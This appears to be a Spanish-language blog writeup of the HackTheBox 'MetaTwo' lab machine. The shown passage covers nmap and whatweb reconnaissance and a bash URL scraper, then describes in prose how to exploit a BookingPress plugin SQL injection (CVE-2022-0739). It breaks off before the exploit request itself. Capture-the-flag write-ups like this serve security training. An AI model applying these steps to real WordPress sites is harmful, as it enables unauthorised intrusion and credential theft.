<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Hackthebox Writeup Metatwo" /><meta property="og:locale" content="en" /><meta name="description" content="Overview" /><meta property="og:description" content="Overview" /><link rel="canonical" href="https://e1p0tr0.github.io/posts/HTBMetaTwo/" /><meta property="og:url" content="https://e1p0tr0.github.io/posts/HTBMetaTwo/" /><meta property="og:site_name" content="Marss" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-11-15T23:57:17-05:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Hackthebox Writeup Metatwo" /><meta name="twitter:site" content="@twitter_username" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-11-15T23:57:17-05:00","datePublished":"2022-11-15T23:57:17-05:00","description":"Overview","headline":"Hackthebox Writeup Metatwo","mainEntityOfPage":{"@type":"WebPage","@id":"https://e1p0tr0.github.io/posts/HTBMetaTwo/"},"url":"https://e1p0tr0.github.io/posts/HTBMetaTwo/"}</script><title>Hackthebox Writeup Metatwo | Marss</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Marss"><meta name="application-name" content="Marss"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /assets/img/avatar/avatar.jpg " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Marss</a></div><div class="site-subtitle font-italic">Freelance Professional [eJPTv2]</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/E1P0TR0" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/twitter_username" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['marsello.guillen','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Hackthebox Writeup Metatwo</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hackthebox Writeup Metatwo</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/username">Marsello Guillén</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1668574637" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-11-15 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="5830 words"> <em>32 min</em> read</span></div></div></div><div class="post-content"><h1 id="overview">Overview</h1><ol><li>Worpress credentials by <strong>Unauthenticated SQL Injection (CVE-2022-0739)</strong><li>FTP credentials by <strong>Authenticated XXE Within the Media Library (CVE-2021-29447)</strong><li>SSH login by <strong>Information leak in FTP files</strong> (Foothold)<li>Export of credentials in passpie by <strong>Gnupg key leak</strong> (Privilege Escalation)</ol><p><img data-src="/assets/img/htb/writeups/metatwo/logo.png" alt="Logo" class="shadow" data-proofer-ignore></p><div class="table-wrapper"><table><thead><tr><th style="text-align: center">OS<th style="text-align: center">IP<th style="text-align: center">Release Date<th style="text-align: center">Difficulty<th style="text-align: center">Points<tbody><tr><td style="text-align: center">Linux<td style="text-align: center">10.10.11.186<td style="text-align: center">29 Oct 2022<td style="text-align: center">Easy<td style="text-align: center">20</table></div><hr /><p>Antes de empezar verificamos que estamos conectado a la <strong>VPN</strong> de HTB y tenemos conexión con la máquina:</p><div class="language-shell nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="o">&gt;</span> ping <span class="nt">-c1</span> 10.10.11.186
PING 10.10.11.186 <span class="o">(</span>10.10.11.186<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
64 bytes from 10.10.11.186: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>63 <span class="nb">time</span><span class="o">=</span>139 ms
                                          <span class="se">\_</span>_____________________ Linux Machine
<span class="nt">---</span> 10.10.11.186 ping statistics <span class="nt">---</span>
1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
          <span class="se">\_</span>________________<span class="se">\_</span>___________________________________ Successful connection
rtt min/avg/max/mdev <span class="o">=</span> 138.695/138.695/138.695/0.000 ms
</pre></table></code></div></div><blockquote><p>Explicación de parámetros:</p><p>-c &lt;count&gt; : Número de paquetes ICMP que deseamos enviar a la máquina</p></blockquote><h2 id="enumeration"><span class="mr-2">Enumeration</span><a href="#enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><hr /><p>Empezamos con la fase de reconocimiento haciendo un escaneo de tipo <strong>TCP (Transfer Control Protocol)</strong> para descubrir los puertos abiertos de la máquina:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="go">❯ nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.11.186
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-16 00:06 -05
Nmap scan report for 10.10.11.186
Host is up (0.15s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
              \_________________ File Transfer Protocol
22/tcp open  ssh
              \_________________ Secure Shell Protocol
80/tcp open  http
              \_________________ Hypertext Transfer Protocol
</span></pre></table></code></div></div><blockquote class="prompt-info"><div><p>Explicación de parámetros :</p></div></blockquote><blockquote><p>-p- : Escanear todos los puertos, del 1 al 65,535</p><p>–open : Escanear solo puertos abiertos</p><p>-sS : Solo enviar paquetes de tipo SYN (inicio de conexión), incrementa velocidad del escaneo</p><p>--min-rate &lt;number&gt; : Enviar una taza (&lt;number&gt;) de paquetes por segundo como mínimo</p><p>-n : No buscar nombres de dominio asociadas a la IP en cuestión (rDNS)</p><p>-Pn : Omitir el descubrimiento de hosts y continuar con el escaneo de puertos, incrementa velocidad del escaneo</p></blockquote><p>Ahora escaneamos más a fondo para enumerar que servicios corren por detrás de los puertos <strong>21(FTP)</strong> - <strong>22(SSH)</strong> - <strong>80(HTTP)</strong>:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre><td class="rouge-code"><pre><span class="go">❯ nmap -p21,22,80 -sCV 10.10.11.186 -oN open_ports_TCP
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-16 00:08 -05
Nmap scan report for 10.10.11.186
Host is up (0.14s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp?
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (Debian) [::ffff:10.10.11.186]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 c4b44617d2102d8fec1dc927fecd79ee (RSA)
|   256 2aea2fcb23e8c529409cab866dcd4411 (ECDSA)
|_  256 fd78c0b0e22016fa050debd83f12a4ab (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to http://metapress.htb/
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.93%I=7%D=11/16%Time=63747066%P=x86_64-pc-linux-gnu%r(Gen
SF:ericLines,8F,"220\x20ProFTPD\x20Server\x20\(Debian\)\x20\[::ffff:10\.10
SF:\.11\.186\]\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20cr
SF:eative\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20creativ
</span><span class="gp">SF:e\r\n");</span><span class="w">
</span><span class="gp">Service Info: OS: Linux;</span><span class="w"> </span>CPE: cpe:/o:linux:linux_kernel
</pre></table></code></div></div><blockquote class="prompt-info"><div><p>Explicación de parámetros :</p></div></blockquote><blockquote><p>-p &lt;port_1,port_2,...&gt; : Indicamos que puertos queremos escanear</p><p>-sCV (Fusión de parámetros -sC -sV)</p><p>-sC : Ejecutar en los puertos scripts por defecto de nmap</p><p>-sV : Activar detección de versiones de los servicios que corren por los puertos</p><p>-oN &lt;file&gt; : Guardar el output del escaneo en un archivo con formato Nmap</p></blockquote><p>De primeras <code class="language-plaintext highlighter-rouge">nmap</code> no nos muestra información interesante por el puerto <strong>21(FTP)</strong>. Por parte del puerto <strong>22(SSH)</strong> observamos que la versión no es menor a la <code class="language-plaintext highlighter-rouge">7.7</code>, lo cúal nos permitiría enumerar usuarios. Por ello, empezamos enumerando el servicio web del puerto <strong>80(HTTP)</strong> que de primeras nos muestra una redirección al dominio <code class="language-plaintext highlighter-rouge">metapress.htb</code></p><p>Ya que se aplica el concepto de <strong>Virtual hosting</strong>, lo que hacemos es agregar esta ruta a nuestro archivo del sistema que se <strong>encarga de asociar/resolver/apuntar una dirección ip a un nombre de dominio</strong> <em>/etc/hosts</em> : <code class="language-plaintext highlighter-rouge">echo '10.10.11.186 metapress.htb' &gt;&gt; /etc/hosts</code></p><p>Ahora comenzamos a enumerar que tecnologías usa el dominio encontrado:</p><blockquote><p>Usando <code class="language-plaintext highlighter-rouge">whatweb</code></p></blockquote><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="go">❯ whatweb metapress.htb
</span><span class="gp">http://metapress.htb [200 OK] Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.18.0], IP[10.10.11.186], MetaGenerator[WordPress 5.6.2], PHP[8.0.24], PoweredBy[--], Script, Title[MetaPress &amp;#</span>8211<span class="p">;</span> Official company site], UncommonHeaders[link], WordPress[5.6.2], X-Powered-By[PHP/8.0.24], nginx[1.18.0]
</pre></table></code></div></div><p>Lo que nos llama la atención es el uso del CMS <code class="language-plaintext highlighter-rouge">Wordpress</code>, a pesar de tener la versión no conseguimos encontrar alguna vulnerabilidad al respecto. Sin embargo, es muy común que las principales fallas de seguridad sean a través de los <strong>plugins</strong> que tienen instalados</p><blockquote class="prompt-info"><div><p>Enumeración manual en <code class="language-plaintext highlighter-rouge">Wordpress</code>: <a href="https://www.armourinfosec.com/wordpress-enumeration/">https://www.armourinfosec.com/wordpress-enumeration/</a></p></div></blockquote><p>Para ello hice un script en <code class="language-plaintext highlighter-rouge">bash</code> con el objetivo de aplicar la técnica de <strong>Web scraping</strong> y encontrar todas las urls disponibles:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
</pre><td class="rouge-code"><pre><span class="c">#!/bin/bash</span>

<span class="c">## Ctrl + c </span>
<span class="c"># (function)</span>
signal_handler<span class="o">(){</span>
  <span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">[!] User terminated."</span>
  tput cnorm<span class="p">;</span> <span class="nb">exit </span>1 <span class="c"># return cursor and exit</span>
<span class="o">}</span>
<span class="c"># (signal)</span>
<span class="nb">trap </span>signal_handler SIGINT


<span class="c">## Functions</span>
<span class="c"># display help panel</span>
<span class="nb">help</span><span class="o">(){</span>
  <span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">Description: Web scraping or website"</span>
  <span class="nb">echo
  echo</span> <span class="s2">"[*] Use: </span><span class="nv">$0</span><span class="s2"> target_url"</span>
  <span class="nb">echo</span>
<span class="o">}</span>

<span class="c"># valid arguments</span>
<span class="k">if</span> <span class="o">[[</span> <span class="nv">$# </span><span class="nt">-ne</span> 1 <span class="o">]]</span>
<span class="k">then
  </span><span class="nb">help
  </span>tput cnorm<span class="p">;</span> <span class="nb">exit </span>1
<span class="k">fi</span>

<span class="c"># get the urls of a website</span>
get_urls<span class="o">(){</span>
  <span class="nb">local </span><span class="nv">scan_depth_limit</span><span class="o">=</span><span class="nv">$2</span>
  <span class="nv">target_url</span><span class="o">=</span><span class="nv">$1</span>

  <span class="nb">local </span><span class="nv">website_urls</span><span class="o">=</span><span class="si">$(</span>curl <span class="nt">-s</span> <span class="nv">$target_url</span> | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s2">"href=[</span><span class="se">\"</span><span class="s2">|'](.*?)[</span><span class="se">\"</span><span class="s2">|']"</span> | <span class="nb">awk</span> <span class="nt">-F</span><span class="s1">'='</span> <span class="s1">'{print $2}'</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s2">"</span><span class="se">\"</span><span class="s2">'"</span> | <span class="nb">grep</span> <span class="nt">-vE</span> <span class="s2">"^(#|//)"</span> | <span class="nb">sort</span> <span class="nt">-u</span> | xargs<span class="si">)</span>
  <span class="nv">IFS</span><span class="o">=</span><span class="s1">' '</span> <span class="nb">read</span> <span class="nt">-ra</span> website_urls_array <span class="o">&lt;&lt;&lt;</span> <span class="s2">"</span><span class="nv">$website_urls</span><span class="s2">"</span>
  
  <span class="o">((</span>scan_depth_limit--<span class="o">))</span>
  <span class="k">for </span>url <span class="k">in</span> <span class="s2">"</span><span class="k">${</span><span class="nv">website_urls_array</span><span class="p">[@]</span><span class="k">}</span><span class="s2">"</span>
  <span class="k">do
    if</span> <span class="o">[[</span> <span class="s2">"</span><span class="nv">$url</span><span class="s2">"</span> <span class="o">!=</span> <span class="k">*</span><span class="s2">"</span><span class="nv">$target_domain</span><span class="s2">"</span><span class="k">*</span> <span class="o">]]</span>
    <span class="k">then
      continue
    fi
    
    </span><span class="nb">echo</span> <span class="nv">$url</span>
    <span class="nb">echo</span> <span class="nv">$url</span> <span class="o">&gt;&gt;</span> all_urls.txt

    <span class="k">if</span> <span class="o">[[</span> <span class="o">!</span> <span class="nv">$scan_depth_limit</span> <span class="nt">-eq</span> 0 <span class="o">]]</span>
    <span class="k">then
      </span>get_urls <span class="s2">"</span><span class="nv">$url</span><span class="s2">"</span> <span class="nv">$scan_depth_limit</span> &amp;
    <span class="k">else
      return
    fi
  done</span><span class="p">;</span> <span class="nb">wait</span>
<span class="o">}</span>


<span class="c"># Main flow</span>
<span class="c"># ---------</span>
tput civis <span class="c"># hice cursor (esthetic)</span>

<span class="nv">scan_depth_limit</span><span class="o">=</span>4

<span class="nb">echo</span> <span class="nt">-n</span> <span class="s1">''</span> <span class="o">&gt;</span> all_urls.txt <span class="c"># create file to save urls</span>

<span class="nv">target_domain</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="nv">$1</span> | <span class="nb">awk</span> <span class="nt">-F</span><span class="s1">'//'</span> <span class="s1">'{print $2}'</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'\n'</span><span class="si">)</span> <span class="c"># only find with specific domain</span>
<span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">[*] Scanning site: </span><span class="nv">$1</span><span class="se">\n</span><span class="s2">"</span>
get_urls <span class="s2">"</span><span class="nv">$1</span><span class="s2">"</span> <span class="nv">$scan_depth_limit</span> <span class="c"># call function (recursive)</span>

<span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">[+] Saving output: all_urls.txt"</span>
<span class="nb">cat </span>all_urls.txt | <span class="nb">sort</span> <span class="nt">-u</span> | sponge all_urls.txt <span class="c"># filter unique urls and save</span>

tput cnorm <span class="c"># return cursor</span>
</pre></table></code></div></div><blockquote class="prompt-info"><div><p>Puedes encontrar el script en mi repositorio <a href="https://github.com/E1P0TR0/CVE-Machines_htb/blob/main/Auto-tools_MetaTwo/url_scraping.sh">https://github.com/E1P0TR0</a></p></div></blockquote><p>Al ejecutarlo abrimos el listados de las urls encontradas:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
</pre><td class="rouge-code"><pre><span class="go">❯ cat all_urls.txt
───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: all_urls.txt
───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ http://metapress.htb/
   2   │ http://metapress.htb/about-us/
   3   │ http://metapress.htb/author/admin/
   4   │ http://metapress.htb/author/admin/feed/
   5   │ http://metapress.htb/category/news/
   6   │ http://metapress.htb/category/news/feed/
   7   │ http://metapress.htb/comments/feed/
   8   │ http://metapress.htb/events/
   9   │ http://metapress.htb/feed/
  10   │ http://metapress.htb/hello-world/
  11   │ http://metapress.htb/?p=1
  12   │ http://metapress.htb/?p=19
  13   │ http://metapress.htb/?p=21
  14   │ http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/css/bookingpress_element_theme.css?ver=1.0.10
  15   │ http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/css/bookingpress_front.css?ver=1.0.10
  16   │ http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/css/bookingpress_tel_input.css?ver=1.0.10
  17   │ http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/css/bookingpress_vue_calendar.css?ver=1.0.10
  18   │ http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/css/fonts/fonts.css?ver=1.0.10
  19   │ http://metapress.htb/wp-content/themes/twentytwentyone/assets/css/print.css?ver=1.1
  20   │ http://metapress.htb/wp-content/themes/twentytwentyone/style.css?ver=1.1
  21   │ http://metapress.htb/wp-includes/css/dist/block-library/style.min.css?ver=5.6.2
  22   │ http://metapress.htb/wp-includes/css/dist/block-library/theme.min.css?ver=5.6.2
  23   │ http://metapress.htb/wp-includes/wlwmanifest.xml
  24   │ http://metapress.htb/wp-json/
  25   │ http://metapress.htb/wp-json/oembed/1.0/embed?url=http%3A%2F%2Fmetapress.htb%2Fabout-us%2F
</span><span class="gp">  26   │ http://metapress.htb/wp-json/oembed/1.0/embed?url=http%3A%2F%2Fmetapress.htb%2Fabout-us%2F&amp;#</span>038<span class="p">;</span><span class="nv">format</span><span class="o">=</span>xml
<span class="go">  27   │ http://metapress.htb/wp-json/oembed/1.0/embed?url=http%3A%2F%2Fmetapress.htb%2Fevents%2F
</span><span class="gp">  28   │ http://metapress.htb/wp-json/oembed/1.0/embed?url=http%3A%2F%2Fmetapress.htb%2Fevents%2F&amp;#</span>038<span class="p">;</span><span class="nv">format</span><span class="o">=</span>xml
<span class="go">  29   │ http://metapress.htb/wp-json/oembed/1.0/embed?url=http%3A%2F%2Fmetapress.htb%2Fhello-world%2F
</span><span class="gp">  30   │ http://metapress.htb/wp-json/oembed/1.0/embed?url=http%3A%2F%2Fmetapress.htb%2Fhello-world%2F&amp;#</span>038<span class="p">;</span><span class="nv">format</span><span class="o">=</span>xml
<span class="go">  31   │ http://metapress.htb/wp-json/wp/v2/categories/3
  32   │ http://metapress.htb/wp-json/wp/v2/pages/19
  33   │ http://metapress.htb/wp-json/wp/v2/pages/21
  34   │ http://metapress.htb/wp-json/wp/v2/posts/1
  35   │ http://metapress.htb/wp-json/wp/v2/users/1
  36   │ http://metapress.htb/xmlrpc.php?rsd
───────┴──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
</span></pre></table></code></div></div><p>Oservamos el plugin <code class="language-plaintext highlighter-rouge">bookingpress</code> y su versión <code class="language-plaintext highlighter-rouge">1.0.10</code>, con esta información podemos buscar vulnerabilidades asociadas como la siguiente:</p><blockquote><p><a href="https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357">CVE-2022-0739</a></p></blockquote><p><img data-src="/assets/img/htb/writeups/metatwo/CVE-2022-0739.png" alt="CVE-2022-0739" class="shadow" data-proofer-ignore></p><blockquote class="prompt-tip"><div><p>En caso que no encuentras la versión en la url, puedes leer información respecto al plugin en su archivo <code class="language-plaintext highlighter-rouge">readme.txt</code> : <a href="https://developer.wordpress.org/plugins/wordpress-org/how-your-readme-txt-works/">https://developer.wordpress.org/plugins/wordpress-org/how-your-readme-txt-works/</a></p></div></blockquote><h2 id="foothold"><span class="mr-2">Foothold</span><a href="#foothold" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><hr /><blockquote><p>¿ Qué es <code class="language-plaintext highlighter-rouge">bookingpress</code> ?</p><p>Bookingpress es un plugin de Wordpress que nos automatiza un sistema de programación (reservas de citas, pagos, auto-reserva) dirigida a industrias que ofrezcan un servicio que requiera estás características</p></blockquote><p>La vulnerabilidad nos permite, como cualquier usuario no autenticado, <strong>inyectar código SQL y obtener respuesta sobre la base de datos por detrás</strong>.</p><p>Veamos los pasos que debemos seguir:</p><ol><li>Debemos encontrar en la página web un sistema tipo reservas sobre un servicio<li>De la página de servicios debemos extraer, del código fuente, el <code class="language-plaintext highlighter-rouge">nonce</code> <a href="https://codex.wordpress.org/WordPress_Nonces"><strong>“number user once”</strong></a> (ayuda a proteger la autorización sobre una URL)<li>Solicitar una petición al archivo <code class="language-plaintext highlighter-rouge">admin-ajax.php</code> (archivo que ofrece apoyo a los plugins y themes al momento de realizar peticiones) e inyectar código SQL en en el parámetro <code class="language-plaintext highlighter-rouge">total_service</code> de la data por POST</ol><p>Para el paso <code class="language-plaintext highlighter-rouge">1</code>, con una enumeración rápida encontrarás la siguiente página:</p><p><img data-src="/assets/img/htb/writeups/metatwo/vulnerable_page_CVE-2022-0739.png" alt="http://metapress.htb/events" class="shadow" data-proofer-ignore></p><p>Y si nos si nos fijamos en la <a href="https://www.bookingpressplugin.com/documents/quick-start-guide/"><strong>documentación de bookingpress</strong></a> tendremos el mismo formato:</p><p><img data-src="/assets/img/htb/writeups/metatwo/bookingpress_events_doc.png" alt="https://www.bookingpressplugin.com/" class="shadow" data-proofer-ignore></p><blockquote class="prompt-info"><div><p>Tambíen si examinamos el código fuente encontraremos urls enlazadas al plugin <strong>bookingpress</strong></p></div></blockquote><p>En el paso <code class="language-plaintext highlighter-rouge">2</code>, solo es cuestión de buscar en el código fuente el <code class="language-plaintext highlighter-rouge">_wpnonce</code>. Y por último <code class="language-plaintext highlighter-rouge">3</code>, solicitamos la petición de la siguiente manera:</p><blockquote><p>Usando <code class="language-plaintext highlighter-rouge">curl</code></p></blockquote><div class="language-shell nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far 